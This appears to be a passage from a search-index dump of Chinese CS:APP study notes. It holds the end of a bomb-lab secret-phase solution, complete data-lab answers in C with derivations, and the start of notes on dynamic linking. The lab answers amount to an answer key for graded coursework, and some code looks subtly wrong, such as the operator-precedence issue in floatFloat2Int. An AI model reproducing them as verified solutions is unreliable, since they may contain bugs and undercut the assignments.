>: 0x0000000000603290 0x0000000000000000 0x603190 < n31 >: 0x0000000000000006 0x00000000006031f0 0x6031a0 < n31 + 16 >: 0x0000000000603250 0x0000000000000000 0x6031b0 < n34 >: 0x000000000000006b 0x0000000000603210 0x6031c0 < n34 + 16 >: 0x00000000006032b0 0x0000000000000000 0x6031d0 < n45 >: 0x0000000000000028 0x0000000000000000 0x6031e0 < n45 + 16 >: 0x0000000000000000 0x0000000000000000 0x6031f0 < n41 >: 0x0000000000000001 0x0000000000000000 0x603200 < n41 + 16 >: 0x0000000000000000 0x0000000000000000 0x603210 < n47 >: 0x0000000000000063 0x0000000000000000 0x603220 < n47 + 16 >: 0x0000000000000000 0x0000000000000000 0x603230 < n44 >: 0x0000000000000023 0x0000000000000000 0x603240 < n44 + 16 >: 0x0000000000000000 0x0000000000000000 0x603250 < n42 >: 0x0000000000000007 0x0000000000000000 0x603260 < n42 + 16 >: 0x0000000000000000 0x0000000000000000 0x603270 < n43 >: 0x0000000000000014 0x0000000000000000 0x603280 < n43 + 16 >: 0x0000000000000000 0x0000000000000000 0x603290 < n46 >: 0x000000000000002f 0x0000000000000000 0x6032a0 < n46 + 16 >: 0x0000000000000000 0x0000000000000000 0x6032b0 < n48 >: 0x00000000000003e9 0x0000000000000000 0x6032c0 < n48 + 16 >: 0x0000000000000000 0x0000000000000000 24 / \\ 8 32 / \\ / \\ 6 16 2d 6b / \\ / \\ / \\ / \\ 1 7 14 23 28 2f 63 3e9 \u7531\u6b64\u53ef\u77e5 fun7 \u662f BST \u7684\u67e5\u627e\uff0c\u8981\u4f7f\u8fd4\u56de\u503c\u4e3a 2\uff0c\u76ee\u6807\u7ed3\u70b9\u53ef\u4ee5\u662f 0x16 \u6216 0x14 \u3002","title":"secret phase"},{"location":"_csapp/_Labs/datalab/","text":"\u51c6\u5907 \ud83e\uddd0 \u53ea\u80fd\u7528\u9650\u5236\u5185\u7684\u64cd\u4f5c\u7b26\uff0c\u4e14\u6709\u6570\u91cf\u9650\u5236 222 \u53ea\u80fd\u5f15\u7528 0x00-0xff \u5185\u7684\u5e38\u91cf \u6240\u6709\u5b9a\u4e49\u5199\u5728\u6240\u6709\u8d4b\u503c\u524d btest \u9a8c\u8bc1\u7ed3\u679c\u6b63\u786e\u6027\uff0c dlc \u68c0\u67e5\u64cd\u4f5c\u7b26\u6570\u91cf\u548c\u662f\u5426\u7b26\u5408\u8981\u6c42\uff0c drivel.pl \u6700\u7ec8\u8bc4\u5206 1` \ud83e\uddd0 bitxor \ud83e\uddd0 \u53ea\u7528 ~ \u548c & \u5b9e\u73b0 ^ \uff1a x^y = (~x & y) | (x & ~y) = ... /* Legal ops: ~ &, Max ops: 14 */ int bitXor ( int x , int y ) { return ~ ( ~ ( ~ x & y ) & ~ ( x & ~ y )); } 2` \ud83e\uddd0 isTmax \ud83e\uddd0 returns 1 if x is the maximum, two's complement number /* Legal ops: ! ~ & ^ | +, Max ops: 10 */ int isTmax ( int x ) { // return !((x + 1) ^ ~x) & !!(x + 1); return ! ( x + 2 + x ) & !! ( x + 1 ); } \u2003 \u5982\u679c\u6539\u4e3a return !(x + x + 2) & !!(x + 1); \u5c31\u4f1a\u51fa\u9519\uff0c\u95ee\u9898\u4ee3\u7801: void isTmax ( int x ) { int y = ! ( x + x + 2 ); // bug: y=0 printf ( \"%d \\n \" , y ); } int main () { isTmax ( 0x7fffffff ); } \u53ea\u5728 gcc -O0 \u7684\u7b49\u7ea7\u4e0b\u4f1a\u8f93\u51fa 1\uff0c\u5177\u4f53\u539f\u56e0\u4e0d\u660e allOddBits \ud83e\uddd0 return 1 if all odd-numbered bits in word set to 1 where bits are numbered from 0 to 31 /* Legal ops: ! ~ & ^ | + << >>, Max ops: 12 */ int allOddBits ( int x ) { int aa = 0xAA ; aa += aa << 8 ; aa += aa << 16 ; return ! ( ~ x & aa ); } 3` \ud83e\uddd0 isAsciiDigit \ud83e\uddd0 return 1 if 0x30 <= x <= 0x39 \u601d\u8def: \u89c2\u5bdf 0x0 - 0x9 \u6bd4\u7279\u4f4d\u7684\u7279\u70b9\uff0c\u4e2d\u95f4\u4e24\u4e2a\u4f4d\u4e0d\u5e94\u8be5\u6709\u503c\uff0c\u9664\u975e x<8 /* Legal ops: ! ~ & ^ | + << >>, Max ops: 15 */ int isAsciiDigit ( int x ) { int low4b = x & 0x0f ; int h28b = x >> 4 ; return ( ! ( h28b + ~ 0x02 )) & ( ! ( low4b & 0x06 ) | ! ( low4b >> 3 )); } conditional \ud83e\uddd0 same as x ? y : z /* Legal ops: ! ~ & ^ | + << >>, Max ops: 16 */ int conditional ( int x , int y , int z ) { int mask1 = ~ 0 , mask2 = 0 ; mask1 += ! x , mask2 = ~ mask1 ; return ( y & mask1 ) + ( z & mask2 ); } isLessOrEqual \ud83e\uddd0 if x <= y then return 1, else return 0 r=x-y x+- y+- r+- overflow zero x>y, x-y>0 ? ? 1 0 0 x>y, x-y<0 1 0 0 1(+) 0 x=y ? ? 0 0 1 x<y, x-y<0 ? ? 0 0 0 x<y, x-y>0 0 1 1 1(-) 0 /* Legal ops: ! ~ & ^ | + << >>, Max ops: 24 */ int isLessOrEqual ( int x , int y ) { int xtag = ( x >> 31 ) + 1 ; int ytag = ( y >> 31 ) + 1 ; int res = x + ~ y + 1 ; int rtag = (( res >> 31 ) + 1 ) & ( !! res ); // x>0, y<0, r<=0 (+) OR r<0, y>0, r>0 (-) int isOverflow = ( xtag & ( ! ytag ) & ( ! rtag )) | (( ! xtag ) & ytag & rtag ); return ! ( isOverflow ^ rtag ); } 4` \ud83e\uddd0 logicalNeg \ud83e\uddd0 implement the ! operator, using all of the legal operators except ! \u5c06\u6240\u6709\u975e\u96f6\u6570\u6620\u5c04\u5230 0\uff0c\u5229\u7528 f(x)=(x >> 31) | (-x >> 31) \uff0c\u5206\u4e3a: f(0) = 0|0 = 0 f(0x80000000) = -1|-1 = -1 f(x) = f(-x) = 0|-1 = -1 /* Max ops: 12, Rating: 4 */ int logicalNeg ( int x ) { return ( x >> 31 | ( ~ x + 1 ) >> 31 ) + 1 ; } howManyBits \ud83e\uddd0 return the minimum number of bits required to represent x in two's complement, eg: howManyBits(0x80000000) = 32 howManyBits(0) = howManyBits(-1) = 1 \u5bf9\u4e8e\u6709\u7b26\u53f7\u6570 $x$\uff0c$ -2^{n-1} \\leq x \\leq 2^{n-1}-1 $\uff0c\u90a3\u4e48\u95ee\u9898\u8f6c\u5316\u4e3a\u6c42 $n$ $$ \\qquad n = f(x) = \\begin{cases} \\lceil \\log_2(x+1) \\rceil &\\text{if } x \\geq 0 \\\\ \\lceil \\log_2(-x) \\rceil&\\text{if } x < 0 \\end{cases} $$ \u5c06 $x$ \u53d6\u53cd\uff0c\u7531 $f(x) = f(-x-1)$\uff0c\u7ed3\u679c\u4e0d\u53d8\uff0c\u56e0\u6b64\u53ef\u901a\u8fc7\u8865\u7801\u5c06 $x$ \u5148\u7edf\u4e00\u8868\u793a\u4e3a\u6b63/\u8d1f\u6570 (\u6b63\u6570\u67e5\u5de6\u8fb9\u7684 0\uff0c\u8d1f\u6570\u67e5 1)\u3002\u7136\u540e\u53ef\u4ee5: \u7edf\u4e00\u8868\u793a\u4e3a\u6b63\uff0c\u7136\u540e\u4e8c\u5206: \u5982\u679c\u5de6\u8fb9\u6709 1\uff0c\u53f3\u8fb9\u7684\u4f4d\u5168\u8ba1\u5165\uff0c\u5411\u5de6\u9012\u5f52\uff1b\u5982\u679c\u6ca1\u6709 1\uff0c\u8ba1 0\uff0c\u5411\u53f3\u9012\u5f52 \u628a\u4e00\u4e2a\u6b63\u6570\u89c6\u4e3a\u591a\u4e2a\u5c0f\u6574\u6570\u7684\u62fc\u63a5\uff0c\u7136\u540e\u8fb9\u79fb\u4f4d\u8fb9\u7edf\u8ba1 bisection (34 ops) /* Legal ops: ! ~ & ^ | + << >>, Max ops: 90 */ int howManyBits ( int x ) { int lz1 , lz2 , lz3 , lz4 , lz5 , lz6 , tmp ; // uniform rep as pos int rep = x ^ ( x >> 31 ); tmp = !! ( rep >> 16 ); lz1 = tmp << 4 ; rep >>= lz1 ; tmp = !! ( rep >> 8 ); lz2 = tmp << 3 ; rep >>= lz2 ; tmp = !! ( rep >> 4 ); lz3 = tmp << 2 ; rep >>= lz3 ; tmp = !! ( rep >> 2 ); lz4 = tmp << 1 ; rep >>= lz4 ; tmp = !! ( rep >> 1 ); lz5 = tmp ; rep >>= lz5 ; lz6 = !! rep ; return lz1 + lz2 + lz3 + lz4 + lz5 + lz6 + 1 ; } naive (56 ops) /* Legal ops: ! ~ & ^ | + << >>, Max ops: 90 */ int howManyBits ( int x ) { // uniform rep as neg int xorMask = (( x >> 31 ) & 1 ) + ~ 0 ; int rep = x ^ xorMask ; int result = 0 ; // construct the mask int seg4 = rep >> 24 ; int seg3 = rep << 8 >> 24 ; int seg2 = rep << 16 >> 24 ; int mask4 = 1 ; int mask3 = ! ( seg4 + 1 ); int mask2 = ( ! ( seg3 + 1 )) & mask3 ; int mask1 = ( ! ( seg2 + 1 )) & mask2 ; int mask = ( mask4 << 24 ) + ( mask3 << 16 ) + ( mask2 << 8 ) + mask1 ; int leftOnes = 0 , tmp ; // repeat x 8 tmp = ( rep >> 7 ) & mask ; leftOnes += tmp ; mask = tmp ; tmp = ( rep >> 6 ) & mask ; leftOnes += tmp ; mask = tmp ; tmp = ( rep >> 5 ) & mask ; leftOnes += tmp ; mask = tmp ; tmp = ( rep >> 4 ) & mask ; leftOnes += tmp ; mask = tmp ; tmp = ( rep >> 3 ) & mask ; leftOnes += tmp ; mask = tmp ; tmp = ( rep >> 2 ) & mask ; leftOnes += tmp ; mask = tmp ; tmp = ( rep >> 1 ) & mask ; leftOnes += tmp ; mask = tmp ; leftOnes += rep & mask ; // divide and add result = leftOnes + ( leftOnes >> 8 ) + ( leftOnes >> 16 ) + ( leftOnes >> 24 ); result &= 0xff ; result = 34 + ~ result ; // 32 + ~result + 1 + 1 return result ; } float \ud83e\uddd0 floatScale2 \ud83e\uddd0 Return bit-level equivalent of expression 2*f for floating point argument f \u9636\u7801\u5168 0: \u76f4\u63a5\u5c06\u5c0f\u6570\u6bb5\u5de6\u79fb\u5e76\u52a0\u5230\u7ed3\u679c\u4e0a \u9636\u7801\u5168 1: \u6309\u8981\u6c42\u8fd4\u56de\u539f\u503c else: \u9636\u7801\u52a0\u4e00 /* Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while * Max ops: 30 */ unsigned floatScale2 ( unsigned uf ) { unsigned result = 0 ; unsigned EXP_MASK = 0x7f800000 ; unsigned M_MASK = 0x007fffff ; if (( uf & EXP_MASK ) == 0 ) { result += ( uf & M_MASK ) << 1 ; result += 0x80000000 & uf ; } else if (( uf & EXP_MASK ) == EXP_MASK ) { result = uf ; } else { result = uf + 0x00800000 ; } return result ; } floatFloat2Int \ud83e\uddd0 Return bit-level equivalent of expression (int) f for floating point argument f exponent <= -1 : \u2002 $v = 1.f \\times 0.5$\uff0c\u6309 C \u8bed\u8a00\u5411 0 \u820d\u5165\u4e3a 0 exponent == 0 : \u2002 $v = 1.f$\uff0c\u5411 0 \u820d\u5165\u4e3a 1\uff0c\u53ef\u4e0e\u4e0b\u9762\u5408\u5e76 0 <= exponent <= 30 : \u2002 $v = 1.f \\times 2^E$\uff0c\u6784\u9020\u6574\u6570 $\\mathrm{i}=1f_1f_2...f_0$ 0 <= exp <= 23 : \u2002 $\\mathrm{i}$ \u53f3\u79fb 23 - exp 23 < exp <= 30 : \u2002 $\\mathrm{i}$ \u5de6\u79fb exp - 23 else: \u2002 \u6ea2\u51fa\uff0c\u6309\u8981\u6c42\u8fd4\u56de 0x80000000u /* Legal ops: Any integer/unsigned operations incl. ||, &&. Also if, while * Max ops: 30 */ int floatFloat2Int ( unsigned uf ) { int result = 0 ; unsigned EXP_MASK = 0x7f800000 ; unsigned M_MASK = 0x007fffff ; unsigned BIAS = 127 ; int exp = (( uf & EXP_MASK ) >> 23 ) - BIAS ; if ( exp <= -1 ) { result = 0 ; } else if ( exp < 31 ) { int m = uf & M_MASK + ( 1 << 23 ); if ( exp <= 23 ) result = m >> ( 23 - exp ); else result = m << ( exp - 23 ); } else { result = 0x80000000u ; } if ( uf >> 31 == 1 ) result = - result ; return result ; } floatPower2 \ud83e\uddd0 Return bit-level equivalent of the expression 2.0^x x > 128 : \u2002 \u6b63\u65e0\u7a77 0x7f800000 1 - B <= x <= 128 : \u2002 \u76f4\u63a5\u8bbe\u7f6e\u9636\u7801 1 - B - 23 <= x < 128 : \u2002 \u6839\u636e x - (1 - B) \u7684\u503c\uff0c\u8bbe\u7f6e\u5c3e\u6570\u7684\u76f8\u5e94\u4f4d else: \u2002 0 /* Legal ops: Any integer/unsigned operations incl. ||, &&. Also if, while * Max ops: 30 */ unsigned floatPower2 ( int x ) { unsigned result = 0 ; int MAX_EXP = 128 ; if ( x >= MAX_EXP ) { result = 0x7f800000 ; } else if ( x >= 1 - 127 ) { result += ( x + 127 ) << 23 ; } else if ( x >= 1 - 127 - 23 ) { int fBitBias = - ( x + 126 ); result += 1 << 23 >> fBitBias ; } else { result = 0 ; } return result ; }","title":"datalab"},{"location":"_csapp/_Labs/datalab/#_1","text":"\u53ea\u80fd\u7528\u9650\u5236\u5185\u7684\u64cd\u4f5c\u7b26\uff0c\u4e14\u6709\u6570\u91cf\u9650\u5236 222 \u53ea\u80fd\u5f15\u7528 0x00-0xff \u5185\u7684\u5e38\u91cf \u6240\u6709\u5b9a\u4e49\u5199\u5728\u6240\u6709\u8d4b\u503c\u524d btest \u9a8c\u8bc1\u7ed3\u679c\u6b63\u786e\u6027\uff0c dlc \u68c0\u67e5\u64cd\u4f5c\u7b26\u6570\u91cf\u548c\u662f\u5426\u7b26\u5408\u8981\u6c42\uff0c drivel.pl \u6700\u7ec8\u8bc4\u5206","title":"\u51c6\u5907"},{"location":"_csapp/_Labs/datalab/#1","text":"","title":"1`"},{"location":"_csapp/_Labs/datalab/#bitxor","text":"\u53ea\u7528 ~ \u548c & \u5b9e\u73b0 ^ \uff1a x^y = (~x & y) | (x & ~y) = ... /* Legal ops: ~ &, Max ops: 14 */ int bitXor ( int x , int y ) { return ~ ( ~ ( ~ x & y ) & ~ ( x & ~ y )); }","title":"bitxor"},{"location":"_csapp/_Labs/datalab/#2","text":"","title":"2`"},{"location":"_csapp/_Labs/datalab/#istmax","text":"returns 1 if x is the maximum, two's complement number /* Legal ops: ! ~ & ^ | +, Max ops: 10 */ int isTmax ( int x ) { // return !((x + 1) ^ ~x) & !!(x + 1); return ! ( x + 2 + x ) & !! ( x + 1 ); } \u2003 \u5982\u679c\u6539\u4e3a return !(x + x + 2) & !!(x + 1); \u5c31\u4f1a\u51fa\u9519\uff0c\u95ee\u9898\u4ee3\u7801: void isTmax ( int x ) { int y = ! ( x + x + 2 ); // bug: y=0 printf ( \"%d \\n \" , y ); } int main () { isTmax ( 0x7fffffff ); } \u53ea\u5728 gcc -O0 \u7684\u7b49\u7ea7\u4e0b\u4f1a\u8f93\u51fa 1\uff0c\u5177\u4f53\u539f\u56e0\u4e0d\u660e","title":"isTmax"},{"location":"_csapp/_Labs/datalab/#alloddbits","text":"return 1 if all odd-numbered bits in word set to 1 where bits are numbered from 0 to 31 /* Legal ops: ! ~ & ^ | + << >>, Max ops: 12 */ int allOddBits ( int x ) { int aa = 0xAA ; aa += aa << 8 ; aa += aa << 16 ; return ! ( ~ x & aa ); }","title":"allOddBits"},{"location":"_csapp/_Labs/datalab/#3","text":"","title":"3`"},{"location":"_csapp/_Labs/datalab/#isasciidigit","text":"return 1 if 0x30 <= x <= 0x39 \u601d\u8def: \u89c2\u5bdf 0x0 - 0x9 \u6bd4\u7279\u4f4d\u7684\u7279\u70b9\uff0c\u4e2d\u95f4\u4e24\u4e2a\u4f4d\u4e0d\u5e94\u8be5\u6709\u503c\uff0c\u9664\u975e x<8 /* Legal ops: ! ~ & ^ | + << >>, Max ops: 15 */ int isAsciiDigit ( int x ) { int low4b = x & 0x0f ; int h28b = x >> 4 ; return ( ! ( h28b + ~ 0x02 )) & ( ! ( low4b & 0x06 ) | ! ( low4b >> 3 )); }","title":"isAsciiDigit"},{"location":"_csapp/_Labs/datalab/#conditional","text":"same as x ? y : z /* Legal ops: ! ~ & ^ | + << >>, Max ops: 16 */ int conditional ( int x , int y , int z ) { int mask1 = ~ 0 , mask2 = 0 ; mask1 += ! x , mask2 = ~ mask1 ; return ( y & mask1 ) + ( z & mask2 ); }","title":"conditional"},{"location":"_csapp/_Labs/datalab/#islessorequal","text":"if x <= y then return 1, else return 0 r=x-y x+- y+- r+- overflow zero x>y, x-y>0 ? ? 1 0 0 x>y, x-y<0 1 0 0 1(+) 0 x=y ? ? 0 0 1 x<y, x-y<0 ? ? 0 0 0 x<y, x-y>0 0 1 1 1(-) 0 /* Legal ops: ! ~ & ^ | + << >>, Max ops: 24 */ int isLessOrEqual ( int x , int y ) { int xtag = ( x >> 31 ) + 1 ; int ytag = ( y >> 31 ) + 1 ; int res = x + ~ y + 1 ; int rtag = (( res >> 31 ) + 1 ) & ( !! res ); // x>0, y<0, r<=0 (+) OR r<0, y>0, r>0 (-) int isOverflow = ( xtag & ( ! ytag ) & ( ! rtag )) | (( ! xtag ) & ytag & rtag ); return ! ( isOverflow ^ rtag ); }","title":"isLessOrEqual"},{"location":"_csapp/_Labs/datalab/#4","text":"","title":"4`"},{"location":"_csapp/_Labs/datalab/#logicalneg","text":"implement the ! operator, using all of the legal operators except ! \u5c06\u6240\u6709\u975e\u96f6\u6570\u6620\u5c04\u5230 0\uff0c\u5229\u7528 f(x)=(x >> 31) | (-x >> 31) \uff0c\u5206\u4e3a: f(0) = 0|0 = 0 f(0x80000000) = -1|-1 = -1 f(x) = f(-x) = 0|-1 = -1 /* Max ops: 12, Rating: 4 */ int logicalNeg ( int x ) { return ( x >> 31 | ( ~ x + 1 ) >> 31 ) + 1 ; }","title":"logicalNeg"},{"location":"_csapp/_Labs/datalab/#howmanybits","text":"return the minimum number of bits required to represent x in two's complement, eg: howManyBits(0x80000000) = 32 howManyBits(0) = howManyBits(-1) = 1 \u5bf9\u4e8e\u6709\u7b26\u53f7\u6570 $x$\uff0c$ -2^{n-1} \\leq x \\leq 2^{n-1}-1 $\uff0c\u90a3\u4e48\u95ee\u9898\u8f6c\u5316\u4e3a\u6c42 $n$ $$ \\qquad n = f(x) = \\begin{cases} \\lceil \\log_2(x+1) \\rceil &\\text{if } x \\geq 0 \\\\ \\lceil \\log_2(-x) \\rceil&\\text{if } x < 0 \\end{cases} $$ \u5c06 $x$ \u53d6\u53cd\uff0c\u7531 $f(x) = f(-x-1)$\uff0c\u7ed3\u679c\u4e0d\u53d8\uff0c\u56e0\u6b64\u53ef\u901a\u8fc7\u8865\u7801\u5c06 $x$ \u5148\u7edf\u4e00\u8868\u793a\u4e3a\u6b63/\u8d1f\u6570 (\u6b63\u6570\u67e5\u5de6\u8fb9\u7684 0\uff0c\u8d1f\u6570\u67e5 1)\u3002\u7136\u540e\u53ef\u4ee5: \u7edf\u4e00\u8868\u793a\u4e3a\u6b63\uff0c\u7136\u540e\u4e8c\u5206: \u5982\u679c\u5de6\u8fb9\u6709 1\uff0c\u53f3\u8fb9\u7684\u4f4d\u5168\u8ba1\u5165\uff0c\u5411\u5de6\u9012\u5f52\uff1b\u5982\u679c\u6ca1\u6709 1\uff0c\u8ba1 0\uff0c\u5411\u53f3\u9012\u5f52 \u628a\u4e00\u4e2a\u6b63\u6570\u89c6\u4e3a\u591a\u4e2a\u5c0f\u6574\u6570\u7684\u62fc\u63a5\uff0c\u7136\u540e\u8fb9\u79fb\u4f4d\u8fb9\u7edf\u8ba1 bisection (34 ops) /* Legal ops: ! ~ & ^ | + << >>, Max ops: 90 */ int howManyBits ( int x ) { int lz1 , lz2 , lz3 , lz4 , lz5 , lz6 , tmp ; // uniform rep as pos int rep = x ^ ( x >> 31 ); tmp = !! ( rep >> 16 ); lz1 = tmp << 4 ; rep >>= lz1 ; tmp = !! ( rep >> 8 ); lz2 = tmp << 3 ; rep >>= lz2 ; tmp = !! ( rep >> 4 ); lz3 = tmp << 2 ; rep >>= lz3 ; tmp = !! ( rep >> 2 ); lz4 = tmp << 1 ; rep >>= lz4 ; tmp = !! ( rep >> 1 ); lz5 = tmp ; rep >>= lz5 ; lz6 = !! rep ; return lz1 + lz2 + lz3 + lz4 + lz5 + lz6 + 1 ; } naive (56 ops) /* Legal ops: ! ~ & ^ | + << >>, Max ops: 90 */ int howManyBits ( int x ) { // uniform rep as neg int xorMask = (( x >> 31 ) & 1 ) + ~ 0 ; int rep = x ^ xorMask ; int result = 0 ; // construct the mask int seg4 = rep >> 24 ; int seg3 = rep << 8 >> 24 ; int seg2 = rep << 16 >> 24 ; int mask4 = 1 ; int mask3 = ! ( seg4 + 1 ); int mask2 = ( ! ( seg3 + 1 )) & mask3 ; int mask1 = ( ! ( seg2 + 1 )) & mask2 ; int mask = ( mask4 << 24 ) + ( mask3 << 16 ) + ( mask2 << 8 ) + mask1 ; int leftOnes = 0 , tmp ; // repeat x 8 tmp = ( rep >> 7 ) & mask ; leftOnes += tmp ; mask = tmp ; tmp = ( rep >> 6 ) & mask ; leftOnes += tmp ; mask = tmp ; tmp = ( rep >> 5 ) & mask ; leftOnes += tmp ; mask = tmp ; tmp = ( rep >> 4 ) & mask ; leftOnes += tmp ; mask = tmp ; tmp = ( rep >> 3 ) & mask ; leftOnes += tmp ; mask = tmp ; tmp = ( rep >> 2 ) & mask ; leftOnes += tmp ; mask = tmp ; tmp = ( rep >> 1 ) & mask ; leftOnes += tmp ; mask = tmp ; leftOnes += rep & mask ; // divide and add result = leftOnes + ( leftOnes >> 8 ) + ( leftOnes >> 16 ) + ( leftOnes >> 24 ); result &= 0xff ; result = 34 + ~ result ; // 32 + ~result + 1 + 1 return result ; }","title":"howManyBits"},{"location":"_csapp/_Labs/datalab/#float","text":"","title":"float"},{"location":"_csapp/_Labs/datalab/#floatscale2","text":"Return bit-level equivalent of expression 2*f for floating point argument f \u9636\u7801\u5168 0: \u76f4\u63a5\u5c06\u5c0f\u6570\u6bb5\u5de6\u79fb\u5e76\u52a0\u5230\u7ed3\u679c\u4e0a \u9636\u7801\u5168 1: \u6309\u8981\u6c42\u8fd4\u56de\u539f\u503c else: \u9636\u7801\u52a0\u4e00 /* Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while * Max ops: 30 */ unsigned floatScale2 ( unsigned uf ) { unsigned result = 0 ; unsigned EXP_MASK = 0x7f800000 ; unsigned M_MASK = 0x007fffff ; if (( uf & EXP_MASK ) == 0 ) { result += ( uf & M_MASK ) << 1 ; result += 0x80000000 & uf ; } else if (( uf & EXP_MASK ) == EXP_MASK ) { result = uf ; } else { result = uf + 0x00800000 ; } return result ; }","title":"floatScale2"},{"location":"_csapp/_Labs/datalab/#floatfloat2int","text":"Return bit-level equivalent of expression (int) f for floating point argument f exponent <= -1 : \u2002 $v = 1.f \\times 0.5$\uff0c\u6309 C \u8bed\u8a00\u5411 0 \u820d\u5165\u4e3a 0 exponent == 0 : \u2002 $v = 1.f$\uff0c\u5411 0 \u820d\u5165\u4e3a 1\uff0c\u53ef\u4e0e\u4e0b\u9762\u5408\u5e76 0 <= exponent <= 30 : \u2002 $v = 1.f \\times 2^E$\uff0c\u6784\u9020\u6574\u6570 $\\mathrm{i}=1f_1f_2...f_0$ 0 <= exp <= 23 : \u2002 $\\mathrm{i}$ \u53f3\u79fb 23 - exp 23 < exp <= 30 : \u2002 $\\mathrm{i}$ \u5de6\u79fb exp - 23 else: \u2002 \u6ea2\u51fa\uff0c\u6309\u8981\u6c42\u8fd4\u56de 0x80000000u /* Legal ops: Any integer/unsigned operations incl. ||, &&. Also if, while * Max ops: 30 */ int floatFloat2Int ( unsigned uf ) { int result = 0 ; unsigned EXP_MASK = 0x7f800000 ; unsigned M_MASK = 0x007fffff ; unsigned BIAS = 127 ; int exp = (( uf & EXP_MASK ) >> 23 ) - BIAS ; if ( exp <= -1 ) { result = 0 ; } else if ( exp < 31 ) { int m = uf & M_MASK + ( 1 << 23 ); if ( exp <= 23 ) result = m >> ( 23 - exp ); else result = m << ( exp - 23 ); } else { result = 0x80000000u ; } if ( uf >> 31 == 1 ) result = - result ; return result ; }","title":"floatFloat2Int"},{"location":"_csapp/_Labs/datalab/#floatpower2","text":"Return bit-level equivalent of the expression 2.0^x x > 128 : \u2002 \u6b63\u65e0\u7a77 0x7f800000 1 - B <= x <= 128 : \u2002 \u76f4\u63a5\u8bbe\u7f6e\u9636\u7801 1 - B - 23 <= x < 128 : \u2002 \u6839\u636e x - (1 - B) \u7684\u503c\uff0c\u8bbe\u7f6e\u5c3e\u6570\u7684\u76f8\u5e94\u4f4d else: \u2002 0 /* Legal ops: Any integer/unsigned operations incl. ||, &&. Also if, while * Max ops: 30 */ unsigned floatPower2 ( int x ) { unsigned result = 0 ; int MAX_EXP = 128 ; if ( x >= MAX_EXP ) { result = 0x7f800000 ; } else if ( x >= 1 - 127 ) { result += ( x + 127 ) << 23 ; } else if ( x >= 1 - 127 - 23 ) { int fBitBias = - ( x + 126 ); result += 1 << 23 >> fBitBias ; } else { result = 0 ; } return result ; }","title":"floatPower2"},{"location":"_csapp/_Link/dynlink/","text":"1. \u52a8\u6001\u94fe\u63a5 \ud83e\uddd0 \u9759\u6001\u94fe\u63a5\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u63d0\u9ad8\u4e86\u6a21\u5757\u5316\u7684\u6548\u7387\uff0c\u4f46: \u6d6a\u8d39\u5185\u5b58: \u2002 \u57fa\u672c\u4e0a\u6bcf\u4e2a C \u7a0b\u5e8f\u7684\u4ee3\u7801\u6bb5\u90fd\u6709\u6807\u51c6 I/O \u51fd\u6570 \u4e0d\u6613\u66f4\u65b0: \u2002 \u5982\u679c\u67d0\u4e2a\u6a21\u5757 _.o \u66f4\u65b0\uff0c\u53ef\u80fd\u9700\u8981\u6574\u4e2a\u9879\u76ee\u91cd\u65b0\u7f16\u8bd1 \u5171\u4eab\u5e93\u662f\u81f4\u529b\u4e8e\u89e3\u51b3\u9759\u6001\u5e93\u7f3a\u9677\u7684\u73b0\u4ee3\u4ea7\u7269\u3002\"\u5171\u4eab\" \u4f53\u73b0\u5728\u4e8e: \u540c\u4e00\u4e2a\u9879\u76ee\u4e0b\u53ea\u9700\u8981 _.so \u7684\u4e00\u4e2a\u526f\u672c \u4e0d\u540c\u8fdb\u7a0b\u5728\u5185\u5b58\u4e2d\u5171\u4eab _.so \u7684 .text \u8282 addvec.c int addcnt = 0 ; void addvec ( int * x , int * y , int * z , int n ) { int i ; addcnt ++ ; for ( i = 0 ; i < n ; ++ i ) z [ i ] = x [ i ] + y [ i ]; } multvec.c int multcnt = 0 ; void multvec ( int * x , int * y , int * z , int n ) { int i ; multcnt ++ ; for ( i = 0 ; i < n ; ++ i ) z [ i ] = x [ i ] * y [ i ]; } main.c #include <stdio.h> #include \"vector.h\" int x [ 2 ] = { 1 , 2 }; int y [ 2 ] = { 3 , 4 }; int z [ 2 ]; int main () { addvec ( x , y , z , 2 ); printf ( \"z = [%d %d] \\n \" , z [ 0 ], z [ 1 ]); return 0 ; } \u4ecd\u4ee5\u8fd9\u90e8\u5206\u7a0b\u5e8f\u4e3a\u4f8b\uff0c\u5148\u901a\u8fc7\u94fe\u63a5\u521b\u5efa\u5171\u4eab\u5e93\uff0c\u5728\u5c06\u5b83\u94fe\u63a5\u5230\u53ef\u6267\u884c\u7a0b\u5e8f\u4e2d: $ gcc -shared -fpic -o libvector.so addvec.c multvec.c $ gcc -no-pie -o progd main.c ./libvector.so \u52a8\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u7684\u6267\u884c\u903b\u8f91\u4e3a: \u5148\u6267\u884c\u90e8\u5206\u94fe\u63a5\uff0c\u590d\u5236\u4e00\u4e9b\u7b26\u53f7\u8868\u548c\u91cd\u5b9a\u4f4d\u4fe1\u606f\uff0c\u65b9\u4fbf\u8fd0\u884c\u65f6\u89e3\u6790\u5bf9 _.so \u7684\u5f15\u7528 \u4f8b\u5982\uff0c progd \u5728\u8fd0\u884c\u524d\u53ef\u4ee5\u786e\u5b9a\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u52a8\u6001\u7b26\u53f7\u3001PLT \u6761\u76ee\u548c\u90e8\u5206 GOT \u6761\u76ee \u8fd0\u884c prog \u540e\uff0cloader \u5148\u628a\u63a7\u5236\u4f20\u9012\u7ed9\u52a8\u6001\u94fe\u63a5\u5668\uff0c\u6267\u884c\u52a8\u6001\u94fe\u63a5: \u4ee5 prog \u4e3a\u6839\u7ed3\u70b9 BFS\uff0c\u88c5\u8f7d\u6240\u6709\u5171\u4eab\u5bf9\u8c61\uff0c\u5408\u5e76\u5b83\u4eec\u7684\u7b26\u53f7\u8868\uff0c\u83b7\u5f97\u5168\u5c40\u7b26\u53f7\u8868 (\u786e\u5b9a\u8fd0\u884c\u65f6\u5730\u5740\u3001\u89e3\u51b3\u7b26\u53f7\u51b2\u7a81\u3001\u586b\u5199\u91cd\u5b9a\u4f4d\u8282) \u91cd\u5b9a\u4f4d prog \u548c\u5404\u4e2a\u6a21\u5757\u7684 GOT \u8868\u548c PLT \u8868\uff0c\u89e3\u6790\u7b26\u53f7\u5f15\u7528 \u91cd\u5b9a\u4f4d\u540e\uff0c\u5982\u679c\u67d0\u4e2a\u6a21\u5757\u6709 .init \u6bb5\uff0c\u6267\u884c\u5b83 \u5c06\u63a7\u5236\u4f20\u9012\u7ed9 prog \uff0c\u7a0b\u5e8f\u5f00\u59cb\u8fd0\u884c 